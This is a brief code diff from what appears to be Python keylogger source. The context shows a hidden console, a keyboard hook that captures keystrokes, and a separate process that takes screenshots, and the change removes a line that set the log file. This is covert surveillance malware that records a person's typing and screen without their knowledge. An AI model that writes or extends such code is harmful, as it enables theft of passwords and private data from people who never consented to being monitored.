@@ -24,7 +24,6 @@ def hide_console():
 def main():
     key_logger = KeyCatcher()
     key_logger.set_key_hook()
-    key_logger.set_data_file("data_file.log")
     p = Process(target=key_logger.take_screen_shot)
     p.start()
     wait_for_messages_forever()
